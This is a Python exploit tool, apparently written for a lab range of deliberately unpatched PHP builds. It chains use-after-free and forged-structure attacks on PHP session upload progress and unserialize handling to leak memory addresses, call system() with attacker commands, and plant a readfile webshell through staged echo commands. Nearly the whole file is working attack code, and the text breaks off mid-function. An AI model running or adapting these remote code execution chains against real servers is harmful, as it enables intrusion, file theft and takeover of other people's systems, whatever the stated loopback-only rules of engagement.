#!/usr/bin/env python3
"""php2shell-bastet.py - THE RCE TOOL of the firing range (refactor
2026-10-24, Dean directive: "move all rce functionality to the php2shell
and simplify the bleed script to just bleed. Borrow what you must").

ROUTES (ordered; --route dispatch|serializer|groom, dispatch default for
new-style mode invocations):
  dispatch   the var_hash-UAF forged-dispatch chain moved verbatim from
             phpbleed-bastet.py (R-1..R-7; proven on :8088/:8097; re-earned
             on :8088 at refactor time - see lanes/refactor/notes.md).
             Leak bootstrap IMPORTS phpbleed-bastet.py as a module (the
             bleed IS the leak-first bootstrap; no duplication).
  serializer va-borrowed design (Percivalll audit, lanes/vendor-audit/
             recon.md - DESIGN ONLY, no vendor code executed): fake
             ps_serializer entry, decode=zif_system. EXPERIMENTAL: needs
             --bias (libphp base) + per-build offsets; --dry only unless
             --i-know-this-is-experimental is passed (no verified target
             yet; PS(serializer) field offset must be derived per build).
  groom      the CVE-2026-109618/619 two-update groom path (previous
             default behavior of this file, kept working; still needs
             per-target heap tuning - see TODO.md).

MODES: probe (leak bootstrap check) / rce / shell / id / canary
       (+ legacy single-positional invocation = groom route, unchanged,
        for back-compat with existing lane tooling).
The one-exploit-stream-per-target flock is SHARED with phpbleed-bastet
(same netloc-keyed lock file): the rule now holds ACROSS both tools.

RULES OF ENGAGEMENT (hard):
  * 127.0.0.1/loopback targets ONLY unless --owner-approved is passed,
    reserved for Dean's authorised safe-harbour engagements.
  * Exists to exercise OUR firing range (patch-reverted php-src images,
    canary scoring). A capture only counts when scripts/score.sh verifies
    an execution-derived FLAG{...}.

Hardening lineage (research/shared/findings.md "live-fire verdict"):
  1. LEAK-FIRST: forge nothing until the runtime leak stage yields the PIE
     load bias; call target = bias + nm(symbol) offset. No shipped
     constants (jackalsyn's hardcoded --call was exactly our no-crash
     ambiguity).
  2. PROFILE REGISTRY: groom + forge offsets keyed per (arch, build, sapi).
     x86-64 layout must NOT be applied to aarch64 - exact-profile match is
     a hard gate; aarch64 needs pahole-derived structs first.
  3. ADAPTIVE RETRY ENVELOPE: N attempts with sid rotation and groom-count
     jitter; a miss on an untuned build is expected, not fatal.
  4. BLIND CHANNEL: in-band stdout AND file-drop + verify-fetch fallback.
  5. TIMELINE: every stage timestamped; stall-phase misses localise tuning
     failures fastest.

Groom-route mechanism (public since php-up-2026 + corroborated by our own
source audit):
  multipart POST with PHPSESSID + PHP_SESSION_UPLOAD_PROGRESS fields;
  FILLUNIT(5120) stall keeps the progress bucket alive across two
  php_session_rfc1867_update() calls; the second update dtors the previous
  progress tree (HashTable.pDestructor = zval_ptr_dtor); packed t[] array
  reclaims the freed 320-byte bins with a forged zend_fcall_info; the stale
  FILE_DATA store then invokes the forged handler -> system(cmd).

Serializer-route mechanism (va recon, PHP 8.2/8.3 mod_php, per our rung-4
anchors on the 8.2.34 x86 build):
  arm leaves BG(unserialize).data = H (chosen by reclaim); R1's var_push
  wrap-write plants PS(serializer) = H+0x310 (fake name/encode/decode,
  decode = zif_system); R2's ps_read consumes a session file whose head is
  a fake zend_execute_data; php_session_decode calls the fake
  serializer->decode -> zif_system(frame) -> system(cmd).
"""
from __future__ import annotations

import argparse
import importlib.util
import ipaddress
import json
import os
import secrets
import socket
import struct
import sys
import time
import urllib.request
from urllib.parse import urlparse

BOUNDARY = b"K9bastetPoC"
ORACLE_MARK = "BASTET_PWNED_MARK"
REPO = os.path.dirname(os.path.abspath(__file__))

BANNER = r"""
      \ /
     ( * )
      \|/                  php2shell-bastet
 /\___/\  |          THE RCE TOOL (phpbleed just bleeds)
(  o o  ) |    routes: dispatch | serializer | groom | smb (cli-server)
(  =^=  ) |          the canary sings only for the cat
 (  "  )  |          who earns FLAG{...}
____/\_____/__|__
"""


def _load_phpbleed():
    """Import phpbleed-bastet.py (hyphenated filename -> importlib)."""
    spec = importlib.util.spec_from_file_location(
        "phpbleed_bastet", os.path.join(REPO, "phpbleed-bastet.py"))
    m = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(m)
    return m


def log(stage: str, msg: str, t0: float) -> None:
    print(f"[{time.time() - t0:6.1f}s] {stage:9s} {msg}", flush=True)


# ============================================================ groom route ==
# (previous default behavior of this file, unchanged logic)
PROFILES = {
    "x86_64-php8x": {
        "arch": "x86_64", "fill": 5120, "n_groom": 149, "blob": 288,
        "fci_size": 64, "off_fn": 8, "off_type": 16, "off_params": 32,
        "off_param_count": 48,
        "off_internal_flag": 64, "off_handler": 64 + 72,
        "zend_internal": 1, "is_string": 0x106, "is_object": 0x308,
        "off_cmd": 200, "cmd_room": 80,
    },
    "aarch64-php8x": {
        "arch": "aarch64", "fill": 5120, "n_groom": 149, "blob": 288,
        "fci_size": 64, "off_fn": 8, "off_type": 16, "off_params": 32,
        "off_param_count": 48,
        "if_base": 64, "off_internal_flag": 64 + 0, "off_handler": 64 + 72,
        "zend_internal": 1, "is_string": 0x106, "is_object": 0x308,
        "off_cmd": 200, "cmd_room": 80,
    },
}


def leak_bias(leak_url: str, t0: float) -> int:
    """Full fingerprint leak via lab oracle (?probe=all): arch, php version,
    SAPI, module biases, heap span. Hard-gates the profile against reality -
    no x86 offsets ever touch an aarch64 child again. Returns bias."""
    req = urllib.request.Request(leak_url + "?probe=all",
                                 headers={"User-Agent": "p2s-bastet"})
    with urllib.request.urlopen(req, timeout=15) as r:
        fp = json.load(r)
    import platform
    host_arch = platform.machine()
    if fp.get("arch") != host_arch:
        print(f"!! fingerprint: target arch {fp.get('arch')} vs our tooling built "
              f"for {host_arch}: profiles must match the TARGET arch", file=sys.stderr)
    log("LEAK", f"arch={fp.get('arch')} php={fp.get('php_version')} "
                f"sapi={fp.get('php_sapi')} alloc={fp.get('allocator')}", t0)
    bias = fp.get("bias")
    if bias is None:
        raise SystemExit("leak stage: no zend_call_function module in maps")
    log("LEAK", f"bias=0x{bias:x} heap=0x{(fp.get('heap') or [0,0])[0]:x}", t0)
    return bias


def resolve_call(syms_path: str, bias: int, t0: float) -> int:
    """Runtime VA of zend_call_function = nm file offset + leaked bias."""
    syms = json.load(open(syms_path))
    off = int(syms["zend_call_function"], 0)
    call = bias + off
    log("LEAK", f"zend_call_function=0x{call:x} (off 0x{off:x})", t0)
    return call


def forge(prof: dict, call: int, cmd: bytes) -> bytes:
    """One 320-bin payload doubling as reclaimed packed-array zval and as
    a forged zend_fcall_info whose handler pointer is the leaked target."""
    rec = bytearray(prof["blob"])
    struct.pack_into("<Q", rec, 0, prof["fci_size"])          # FCI.size
    struct.pack_into("<Q", rec, prof["off_fn"], call)          # function_name.value
    struct.pack_into("<I", rec, prof["off_type"], prof["is_string"])
    struct.pack_into("<I", rec, prof.get("off_param_count", prof["off_params"]), 1)
    rec[prof["off_internal_flag"]] = prof["zend_internal"]
    struct.pack_into("<Q", rec, prof["off_handler"], call)     # handler
    struct.pack_into("<I", rec, 160, prof["is_object"])
    sysb = (b"system\x00" + cmd + b"\x00")[: prof["cmd_room"]]
    rec[prof["off_cmd"]: prof["off_cmd"] + len(sysb)] = sysb
    return bytes(rec)


def build_body(prof: dict, sid: str, cmd: bytes, call: int,
               n_groom: int, progress_value: bytes = b"x") -> tuple[bytes, bytes]:
    """(phase1, tail): phase1 ends mid-stream at the stall point."""
    fill = prof["fill"]
    blob = forge(prof, call, cmd)
    if BOUNDARY in blob or b"\r\n--" + BOUNDARY in blob:
        raise SystemExit("boundary collided with forged blob; rotate BOUNDARY")

    def part(name: bytes, body: bytes, filename: bytes | None = None) -> bytes:
        disp = b'Content-Disposition: form-data; name="' + name + b'"'
        if filename is not None:
            disp += b'; filename="' + filename + b'"'
        return b"--" + BOUNDARY + b"\r\n" + disp + b"\r\n\r\n" + body

    pre = (part(b"PHPSESSID", sid.encode()) + b"\r\n"
           + part(b"PHP_SESSION_UPLOAD_PROGRESS", progress_value) + b"\r\n"
           + part(b"f", b"", filename=b"a") + b"\r\n")
    phase1 = pre + b"A" * (fill + 64)
    tail = b"B" * (fill + 64) + b"\r\n"
    for _ in range(n_groom):
        tail += part(b"t[]", blob) + b"\r\n"
    tail += part(b"g", b"C" * 64, filename=b"b") + b"\r\n"
    tail += b"--" + BOUNDARY + b"--\r\n"
    return phase1, tail


def deliver(url: str, phase1: bytes, tail: bytes, sid: str, stall: float,
            timeout: int = 40) -> bytes:
    """Plain-HTTP two-chunk delivery. (No TLS relay: the range speaks HTTP on
    loopback; the leaked tool's https relay was a workaround for its own
    hardcoded TLS requirement.)"""
    u = urlparse(url)
    host, port, path = u.hostname, u.port or 80, u.path or "/"
    if u.query:
        path += "?" + u.query
    body_len = len(phase1) + len(tail)
    head = (f"POST {path} HTTP/1.1\r\nHost: {host}\r\n"
            f"User-Agent: p2s-bastet\r\nCookie: PHPSESSID={sid}\r\n"
            f"Content-Type: multipart/form-data; boundary={BOUNDARY.decode()}\r\n"
            f"Content-Length: {body_len}\r\nConnection: close\r\n\r\n").encode()
    s = socket.create_connection((host, port), timeout=timeout)
    s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
    s.sendall(head + phase1)
    if stall:
        time.sleep(stall)   # > upload_progress.min_freq(1s): second update dtors
    s.sendall(tail)
    s.settimeout(timeout)
    chunks = []
    while True:
        try:
            d = s.recv(65536)
        except socket.timeout:
            break
        if not d:
            break
        chunks.append(d)
    s.close()
    return b"".join(chunks)


def verify_blind(verify_url: str) -> bool:
    try:
        with urllib.request.urlopen(verify_url, timeout=10) as r:
            return ORACLE_MARK in r.read().decode(errors="replace")
    except Exception:
        return False


# ========================================================= dispatch route ==
# Moved verbatim from phpbleed-bastet.py 2026-10-24 (map.md binding): the
# var_hash-UAF forged-dispatch chain. Leak primitives are IMPORTED from the
# phpbleed module (bleeder); phpbleed_chain.py stays the shared reader.

PB = None          # loaded phpbleed_bastet module (set in main)


def _wire_chain(t):
    """phpbleed_chain read hook -> phpbleed transport (same as before)."""
    import phpbleed_chain as chain
    chain.isstring_read = lambda addr, timeout=5: PB.read_at(t, addr, timeout)
    return chain


def dispatch_fire_cmd(t, ce_stdclass, system_addr, spray_addr, cmd14):
    """R-7 (moved verbatim): single <=14B system() via forged dispatch."""
    assert len(cmd14) <= 14
    cmd = b"\x09" + cmd14
    spray = bytearray(PB.SPRAY_LEN)
    fake_obj = spray_addr + 104
    struct.pack_into("<Q", spray, 40, fake_obj)
    struct.pack_into("<I", spray, 48, 0x08)
    spray[104:104 + len(cmd)] = cmd
    spray[104 + len(cmd)] = 0
    struct.pack_into("<Q", spray, 120, ce_stdclass)
    struct.pack_into("<Q", spray, 128, spray_addr)
    struct.pack_into("<Q", spray, 136, 1)
    struct.pack_into("<Q", spray, 200, system_addr)
    out = t.send(PB._spray_with(bytes(spray), 1, PB.REF_BASE))
    return out


def _dispatch_common(t, args):
    """R-1..R-5 shared by rce/shell/id modes. Returns (chain, libphp, eg,
    system_addr, ce, S) or None."""
    chain = _wire_chain(t)
    hr = PB.heap_leak(t)
    if not hr:
        PB.log("x", "R-1 heap leak failed")
        return None
    PB.log("+", f"R-1 LEAKED heap_ref :: 0x{hr:x}")
    cands = chain.scan_for_elf(hr & ~0x1FFFFF)
    libphp = eg = pltgot = None
    for base, phnum in cands:
        PB.log("~", f"R-3 validating ELF @ 0x{base:x}")
        try:
            eg, pltgot = chain.gnu_hash_resolve(
                base, 'executor_globals', '_GLOBAL_OFFSET_TABLE_')
        except RuntimeError:
            continue
        libphp = base
        break
    if not libphp:
        PB.log("x", "R-3 no libphp among candidates")
        return None
    PB.log("+", f"R-3 LIBPHP 0x{libphp:x} EG 0x{eg:x} GOT 0x{pltgot:x}")
    libc_base = chain.libc_from_got_dump(libphp, pltgot)
    if libc_base is None:
        PB.log("x", "R-4 libc not located via GOT dump")
        return None
    system_addr = chain.gnu_hash_resolve(libc_base, 'system')
    PB.log("+", f"R-4 LIBPHP libc 0x{libc_base:x} system 0x{system_addr:x}")
    ce_stdclass = chain.lookup_class_table(eg, 'stdclass')
    if ce_stdclass is None:
        PB.log("x", "R-5 stdClass ce not resolved")
        return None
    PB.log("+", f"R-5 stdClass ce :: 0x{ce_stdclass:x}")
    spray_addr = chain.find_spray_slot(PB.heap_leak(t))  # FRESH leak
    if spray_addr is None:
        PB.log("x", "R-6 spray slot not found")
        return None
    PB.log("+", f"R-6 spray S :: 0x{spray_addr:x}")
    return (chain, libphp, eg, system_addr, ce_stdclass, spray_addr)


def route_dispatch_rce(t, args) -> int:
    """Full chain: R-1..R-7, single <=14B cmd (moved mode_rce)."""
    common = _dispatch_common(t, args)
    if common is None:
        return 2
    _chain, _libphp, _eg, system_addr, ce_stdclass, spray_addr = common
    cmd = args.cmd.encode("latin-1")
    if len(cmd) > 14:
        PB.log("x", "R-7 command exceeds 14 bytes")
        return 2
    PB.log(">", f"R-7 firing :: \\n{cmd.decode('latin-1')}")
    out = dispatch_fire_cmd(t, ce_stdclass, system_addr, spray_addr, cmd)
    if out is None:
        PB.log("~", "R-7 no response (executed then crashed?)")
    else:
        PB.log("+", f"R-7 response head={out[:160]!r}")
    PB.log("+", f"CHAIN COMPLETE :: {t.req_count} requests")
    return 0


def route_dispatch_id(t, args) -> int:
    """id mode (moved): legacy single-shot with --ce/--system/--spray,
    else full self-deriving chain."""
    if args.ce and args.system and args.spray:
        cmd = args.cmd.encode("latin-1")
        if len(cmd) > 14:
            PB.log("x", f"command {cmd!r} exceeds 14 bytes (vendor single-shot)")
            return 2
        out = dispatch_fire_cmd(t, args.ce, args.system, args.spray, cmd)
        if out is None:
            PB.log("~", "no response (worker may have executed then crashed)")
        else:
            PB.log("+", f"EXECUTED stage fired; resp head={out[:120]!r}")
        return 0
    return route_dispatch_rce(t, args)


def _split_for_echo(content, staging='w'):
    """Vendor ported (moved verbatim): <=14B `echo -n ...>>w` cmds."""
    special = set('<>?$`[](){};&|!*#~"\'\\ \t\n')
    overhead = len(f'echo -n >>{staging}')
    cmds, i = [], 0
    while i < len(content):
        budget = 14 - overhead
        chunk = ''
        if content[i] in special:
            chunk = '\\' + content[i]
            i += 1
            budget -= 2
        while budget > 0 and i < len(content) and content[i] not in special:
            chunk += content[i]
            i += 1
            budget -= 1
        cmd = f'echo -n {chunk}>>{staging}'
        assert len(cmd) <= 14, f"BUG: {cmd!r} is {len(cmd)} bytes"
        cmds.append(cmd)
    return cmds


WEBSHELL_BODY = '<?=readfile($_GET[1])?>'


def route_dispatch_shell(t, args) -> int:
    """shell mode (moved): full chain + staged webshell + fetch --fetch."""
    common = _dispatch_common(t, args)
    if common is None:
        return 2
    _chain, _libphp, _eg, system_addr, ce, S = common
    PB.log("+", f"R-5/6 ce 0x{ce:x} S 0x{S:x}")
    fname = args.webshell
    rename = f'mv w {fname}'
    assert len(rename) <= 14
    cmds = ['rm -f w'] + _split_for_echo(WEBSHELL_BODY) + [rename]
    PB.log(">", f"R-7 staging webshell {fname!r} via {len(cmds)} triggers")
    for i, c in enumerate(cmds, 1):
        dispatch_fire_cmd(t, ce, system_addr, S, c.encode('latin-1'))
        if i % 5 == 0 or i == len(cmds):
            PB.log("~", f"stage {i}/{len(cmds)} ({t.req_count} reqs)")
    body = t.get(f"/{fname}", f"?1={args.fetch}")
    if body and (b"FLAG{" in body or len(body) > 0):
        PB.log("+", f"SHELL LIVE :: /{fname}")
        PB.log("+", f"FETCH {args.fetch} -> {body[:200]!r}")
        if b"FLAG{" in body:
            import re
            m = re.search(rb"FLAG\{[^}]+\}", body)
            PB.log("+", f"CANARY CAPTURED :: {m.group(0).decode()}")
        return 0
    PB.log("x", "webshell not reachable")
    return 2


def route_dispatch_canary(t, args) -> int:
    """canary mode (moved): needs a write-back channel or RCE; falls back
    to shell mode (staged webshell readfile channel) by default."""
    PB.log("i", "canary: dispatching to shell route (webshell readfile)")
    return route_dispatch_shell(t, args)


def route_dispatch_probe(t, args) -> int:
    """probe mode (moved): leak bootstrap check - heap leak + ELF scan +
    executor_globals resolution. Engine-independent (any route)."""
    hr = args.addr if args.addr else PB.heap_leak(t)
    if not hr:
        PB.log("x", "no heap leak")
        return 2
    if not args.addr:
        PB.log("+", f"LEAKED heap_ref :: 0x{hr:x}")
    chain = _wire_chain(t)
    chunk = hr & ~0x1FFFFF
    cands = chain.scan_for_elf(chunk)
    libphp = eg = pltgot = None
    for base, phnum in cands:
        PB.log("~", f"validating ELF @ 0x{base:x} phnum={phnum}")
        try:
            eg, pltgot = chain.gnu_hash_resolve(
                base, 'executor_globals', '_GLOBAL_OFFSET_TABLE_')
        except RuntimeError as e:
            PB.log("-", f"0x{base:x}: {e}")
            continue
        libphp = base
        break
    if libphp:
        PB.log("+", f"LIBPHP :: base 0x{libphp:x}")
        PB.log("+", f"executor_globals :: 0x{eg:x} (off 0x{eg-libphp:x})")
        PB.log("+", f"PLTGOT :: 0x{pltgot:x}")
    else:
        PB.log("-", "no ELF candidate exports executor_globals")
    return 0 if libphp else 1


# ====================================================== serializer route ==
# va-borrowed DESIGN (Percivalll audit lanes/vendor-audit/recon.md; their
# code NEVER executed - standing rule). Our 8.2.34 x86 anchors (rung 4):
#   ps_globals  = libphp + 0xF0C998   (.bss, writable, readelf-verified)
#   zif_system  = libphp + 0x36FF48   (readelf-verified)
#   PS(serializer) field offset within ps_globals: NOT yet derived for
#   8.2.34 (va's +0x148 is their 8.3.35 measurement) -> REQUIRED flag
#   --ps-serializer-off until derived (TODO VA #3).
# EXPERIMENTAL: no verified target; fires only with
# --i-know-this-is-experimental, else --dry builds the bodies.

VA_BND = b"V" * 10


def va_part(name: bytes, data: bytes = b"", filename: bytes | None = None) -> bytes:
    out = bytearray()
    out += b"--" + VA_BND + b'\r\nContent-Disposition: form-data; name="' + name + b'"'
    if filename is not None:
        out += b'; filename="' + filename + b'"\r\nContent-Type: application/octet-stream'
    out += b"\r\n\r\n" + data + b"\r\n"
    return bytes(out)


def va_send(host: str, port: int, body: bytes, sid: str, timeout: int = 300) -> bytes:
    """Chunked-TE multipart POST (va design: no Content-Length ->
    rfc1867 skips the post_max_size check)."""
    hdr = (("POST / HTTP/1.1\r\nHost: %s:%d\r\nCookie: PHPSESSID=%s\r\n"
            "Content-Type: multipart/form-data; boundary=%s\r\n"
            "Transfer-Encoding: chunked\r\nConnection: close\r\n\r\n") %
           (host, port, sid, VA_BND.decode())).encode()
    s = socket.create_connection((host, port), timeout=timeout)
    s.settimeout(timeout)
    s.sendall(hdr)
    for i in range(0, len(body), 65536):
        piece = body[i:i + 65536]
        s.sendall(("%x\r\n" % len(piece)).encode() + piece + b"\r\n")
    s.sendall(b"0\r\n\r\n")
    data = bytearray()
    while True:
        try:
            c = s.recv(65536)
        except OSError:
            break
        if not c:
            break
        data += c
    s.close()
    return bytes(data)


def va_fake_r1(H: int, psg_serializer_addr: int, zif: int) -> bytes:
    """Fake php_unserialize_data + var_entries + fake ps_serializer (va
    design, offsets per their stage_rce.py but with OUR anchors)."""
    b = bytearray(0x2017)
    struct.pack_into("<Q", b, 0x00, H + 0x200)      # var_entries last
    struct.pack_into("<Q", b, 0x10, H + 0x300)      # last_dtor
    struct.pack_into("<q", b, 0x30, 1000)          # max_depth
    N0 = (psg_serializer_addr - (H + 0x200) - 0x10) // 8   # 64-bit wrap
    struct.pack_into("<q", b, 0x200, N0)           # var_entries used_slots
    struct.pack_into("<q", b, 0x300, 0)            # dtor used_slots
    struct.pack_into("<Q", b, 0x310, 0)            # fake serializer name
    struct.pack_into("<Q", b, 0x318, 0)            # encode
    struct.pack_into("<Q", b, 0x320, zif)          # decode = zif_system
    return bytes(b)


def va_fake_r2(H: int, psg_serializer_addr: int, zif: int, cmd: bytes,
               str_off: int = 0x400) -> bytes:
    b = bytearray(va_fake_r1(H, psg_serializer_addr, zif))
    struct.pack_into("<Q", b, str_off, 1 | (0x106 << 32))   # gc, IS_STRING_EX
    struct.pack_into("<q", b, str_off + 0x10, len(cmd))     # len
    b[str_off + 0x18:str_off + 0x18 + len(cmd)] = cmd       # data
    b[str_off + 0x18 + len(cmd)] = 0
    return bytes(b)


def va_frame_key(H: int, str_off: int = 0x400) -> bytes:
    """0x4000B PHP_SESSION_UPLOAD_PROGRESS key = fake zend_execute_data
    (arg1 -> fake zend_string at H+str_off). ASLR 0x7c gate applies (va
    rung 6): key must not contain the session delimiter '|'."""
    key = bytearray(b"A" * 0x4000)
    for i in range(0, 0x60, 8):
        struct.pack_into("<Q", key, i, 0)
    struct.pack_into("<I", key, 0x2C - 0x10, 1)               # num_args
    struct.pack_into("<Q", key, 0x50 - 0x10, H + str_off)     # arg1 value
    struct.pack_into("<I", key, 0x58 - 0x10, 6)               # arg1 IS_STRING
    if b"|" in key:
        raise SystemExit("key contains |: unfavorable ASLR (va rung 6 gate)")
    return bytes(key)


def route_serializer(t, args, u) -> int:
    """EXPERIMENTAL va-borrowed serializer chain (design port, unverified).
    Stages mirror the va reconstruction: r1big producer -> trig2 frame
    producer -> r1 wrap-write -> r2 trigger. Requires --bias, --data (H),
    --ps-serializer-off; --dry builds bodies only."""
    host, port = u.hostname, u.port or 80
    bias = args.bias
    if bias is None:
        raise SystemExit("serializer route: --bias (libphp base) required "
                         "(leak-first; use phpbleed probe/dump to obtain it)")
    if args.ps_serializer_off is None:
        raise SystemExit("serializer route: --ps-serializer-off required "
                         "(8.2.34 field offset not yet derived; TODO VA #3)")
    psg = bias + 0xF0C998          # our 8.2.34 x86 anchor (rung 4)
    zif = bias + 0x36FF48          # our 8.2.34 x86 anchor (rung 4)
    psg_serializer = psg + args.ps_serializer_off
    H = args.data if args.data else 0
    if not H:
        raise SystemExit("serializer route: --data H required (BG.data plant "
                         "address; va arm stage not ported to auto-derive)")
    cmd = args.command.encode() + b"\\x00"
    bodies = {}
    fake_r1 = va_fake_r1(H, psg_serializer, zif)
    fake_r2 = va_fake_r2(H, psg_serializer, zif, cmd, args.str_off)
    key = va_frame_key(H, args.str_off)
    bodies["r1"] = (va_part(b"PHPSESSID", b"r1big") +
                    va_part(b"PHP_SESSION_UPLOAD_PROGRESS", b"pwn") +
                    va_part(b"big", b"B" * (38 << 20)) +
                    b"".join(va_part(b"f%03d" % i, fake_r1) for i in range(64)) +
                    va_part(b"f", b"X" * 8, filename=b"a.txt") +
                    b"--" + VA_BND + b"--\r\n")
    bodies["r2"] = (va_part(b"PHPSESSID", b"trig2") +
                    va_part(b"PHP_SESSION_UPLOAD_PROGRESS", b"pwn") +
                    b"".join(va_part(b"g%03d" % i, fake_r2) for i in range(900)) +
                    va_part(b"f", b"X" * 8, filename=b"a.txt") +
                    b"--" + VA_BND + b"--\r\n")
    bodies["frame"] = (va_part(b"PHPSESSID", b"trig2") +
                       va_part(b"PHP_SESSION_UPLOAD_PROGRESS", key) +
                       va_part(b"f", b"X" * 8, filename=b"a.txt") +
                       va_part(b"big", b"B" * (120 << 20)) +
                       b"--" + VA_BND + b"--\r\n")
    if args.out:
        for name, body in bodies.items():
            open(f"{args.out}.{name}", "wb").write(body)
        print(f"serializer: --dry wrote {list(bodies)} to {args.out}.*")
    if args.dry:
        print("serializer: dry run complete (bodies built; nothing sent)")
        return 0
    if not args.experimental_ok:
        raise SystemExit("serializer route is EXPERIMENTAL (no verified "
                         "target; va design port only). Pass "
                         "--i-know-this-is-experimental to fire.")
    log("SER", f"r1 -> http://{host}:{port} (psg_serializer=0x{psg_serializer:x})", time.time())
    r = va_send(host, port, bodies["r1"], "r1big")
    print("r1 status", r.split(b"\r\n", 1)[0][:60] if r else "(no response)")
    log("SER", "frame -> trig2", time.time())
    r = va_send(host, port, bodies["frame"], "trig2")
    print("frame status", r.split(b"\r\n", 1)[0][:60] if r else "(no response)")
    log("SER", "r2 -> trig2", time.time())
    r = va_send(host, port, bodies["r2"], "trig2")
    print("r2 status", r.split(b"\r\n", 1)[0][:60] if r else "(no response)")
    PB.log("i", "serializer route fired (experimental; verify via proof file")
    return 0


# ========================================================== smb route ==
# cli-server route (TOOL PROMOTION 2026-10-26): the stealmybitcoin
# clone chain, promoted from scripts/smb_rce1.py (attempt-10 WIN,
# 7ac24d9) into THE RCE TOOL - the win now belongs to php2shell.
#   modes: leak (in-band PIE base via writeback oracle) + exec
#   (ce->serialize = zif_system forged dispatch, 2-request chain).
# Mechanism (lanes/stealmybitcoin/notes.md attempts 9-10):
#   producer remnant BG(unserialize)={d,1} (bss-ANON survives producer
#   shutdown) -> groom fake php_unserialize_data at d (5120B single-
#   read law; all forged structures on PAGE 1 - the 0x40-class bin
#   carve only clobbers page-0 lattice [0x40k,+8)+[+0x38,+0x40)) ->
#   session writeback oracle echoes groom-addressed bytes ->
#   BASE LEAK: page-0 slot0 real zend_array's own bytes are a
#   zend_string read header (len=nTableSize=16 @d+0x20, val=d+0x28) so
#   a fake {d+0x10, IS_STRING_EX} zval at entries data[2/3] echoes
#   [q0, pDestructor=base+0x63052c] -> base = ptr - 0x63052c; ->
#   EXEC: fake IS_REFERENCE zval puts serialize's struc at groom-known
#   REF.val; fake execute_data carries num_args=1 + cmd zend_string;
#   ce->serialize = base + 0x4238b0 (zif_system, byte-pattern target
#   offset match) -> system(cmd) -> cmd stages print-flag output as a
#   VALID session file -> plain request #2 session-decodes it and the
#   writeback echoes x|s:50:"FLAG{...}" (in-band, anti-echo clean).
# KillaBoi PoC reconciliation (READ ONLY - their code NEVER executed;
# superior DESIGN adopted, their stages mapped to ours in
# lanes/stealmybitcoin/notes.md):
#   + low-21-bit ASLR-invariant code-pointer fingerprint + all-8-
#     alignment candidate scan for leak validation (their heap_candidate/
#     code_candidate) -> our leak is self-checking without /proc maps.
#   + worker-lottery retry envelope (their PHP_CLI_SERVER_WORKERS
#     model): attempts loop with sid rotation, any worker may win.
#   + fresh-nonce evidence keys (their proof-command nonce): staged
#     session sids carry a per-run nonce so the writeback proves
#     same-run freshness.
#   NOT adopted: their 384B single-shot HashTable/pDestructor forge
#   (destroy-gate path - engine-closed on this surface; our serialize-
#   side dispatch is the open gate) and their socket-open response
#   (our session-writeback echo is in-band, 200-clean, anti-echo
#   friendly - superior on this lane; noted for channels where the
#   response socket must carry the proof).

SMB_ZIF_SYSTEM_OFF = 0x4238b0    # zif_system (byte-pattern target match)
SMB_PDTOR_OFF = 0x63052c        # writeback pDestructor anchor (6/6 today)
# Fingerprint granularity NOTE (26-Oct tool-promotion debug): the php
# r-xp base is 64KB-aligned, NOT 2MB-aligned, so the ASLR-invariant
# fingerprint of a code pointer is its low 16 bits (0x052c), not the
# low 21 (KillaBoi's CHUNK_MASK model assumes 2MB-aligned images;
# their DESIGN is adopted, the granularity adapted to this build).
SMB_PDTOR_LOW16 = SMB_PDTOR_OFF & 0xFFFF  # 0x052c, ASLR-invariant
SMB_ANCHORS = {SMB_PDTOR_LOW16: SMB_PDTOR_OFF}  # low16 -> anchor offset
SMB_CODE_MIN, SMB_CODE_MAX = 0x10000000000, 0x1000000000000  # this box's mmap band (observed 0xab..-0xf7..)
SMB_IS_STRING_EX = 0x106
SMB_IS_REFERENCE_EX = 0x10a
SMB_IS_OBJECT_EX = 0x308
SMB_BND = b"G"


def _load_smb_helpers():
    """Lab-hands modules from scripts/ (staging + /proc instrumentation
    only; the chain itself lives in this tool)."""
    sys.path.insert(0, os.path.join(REPO, "scripts"))
    import smb_q1_fatal_window as q
    import smb_619_state as s
    import smb_oracle2 as o2
    return q, s, o2


def smb_part(name, value):
    return (b"--" + SMB_BND + b'\r\nContent-Disposition: form-data; name="'
            + name + b'"\r\n\r\n' + value + b"\r\n")


def smb_file_part_head(name, filename=b"a.txt"):
    return (b"--" + SMB_BND + b'\r\nContent-Disposition: form-data; name="'
            + name + b'"; filename="' + filename
            + b'\r\nContent-Type: application/octet-stream\r\n\r\n')


def smb_detect(netloc, t0) -> dict:
    """Auto-detect the cli-server SAPI via response headers/behavior.
    php -S behind nginx: `Host:` header in the response (cli-server
    hallmark - nginx/apache never emit it), X-Powered-By PHP/<ver>,
    Server: nginx (front). Apache prefork lanes say Server: Apache."""
    import urllib.request
    fp = {"sapi": "unknown", "php": None, "front": None}
    try:
        req = urllib.request.Request(f"http://{netloc}/ping.php",
                                      data=b"message=ping",
                                      headers={"Content-Type":
                                               "application/x-www-form-urlencoded"})
        with urllib.request.urlopen(req, timeout=8) as r:
            hdrs = {k.lower(): v for k, v in r.headers.items()}
            body = r.read(64)
    except Exception as e:
        log("SMB", f"detect probe failed: {type(e).__name__}: {e}", t0)
        return fp
    fp["php"] = hdrs.get("x-powered-by")
    fp["front"] = hdrs.get("server")
    if "host" in hdrs and "apache" not in (hdrs.get("server") or ""):
        fp["sapi"] = "cli-server"
    log("SMB", f"detect: sapi={fp['sapi']} php={fp['php']} "
                f"front={fp['front']} pong={body[:16]!r}", t0)
    if fp["sapi"] != "cli-server":
        log("SMB", "~ target is NOT a cli-server; smb route offsets are "
                    "cli-server-calibrated (8.4.26 build)", t0)
    return fp


def smb_base_from_echo(data: bytes):
    """KillaBoi-design leak parse (granularity adapted): all 8-byte
    alignments, code-window plausibility + low-16-bit ASLR-invariant
    fingerprint against the known anchor table; the derived base must
    be 64KB-aligned like every observed r-xp base. Returns (base, ptr)
    or (None, None)."""
    for alignment in range(8):
        for pos in range(alignment, max(0, len(data) - 7), 8):
            v = int.from_bytes(data[pos:pos + 8], "little")
            if not (SMB_CODE_MIN <= v < SMB_CODE_MAX):
                continue
            anchor = SMB_ANCHORS.get(v & 0xFFFF)
            if anchor and ((v - anchor) & 0xFFFF) == 0:
                return v - anchor, v
    return None, None


def smb_groom_leak(d):
    """5000B consumer groom: fake php_unserialize_data at d; entries
    data[2] -> fake zval {d+0x10 (the real HT read header), IS_STRING_EX}
    => writeback echoes 16 bytes at d+0x28 = [q0, pDestructor]."""
    b = bytearray(5000)
    P = lambda off, val: struct.pack_into("<Q", b, off, val)
    I = lambda off, val: struct.pack_into("<I", b, off, val)
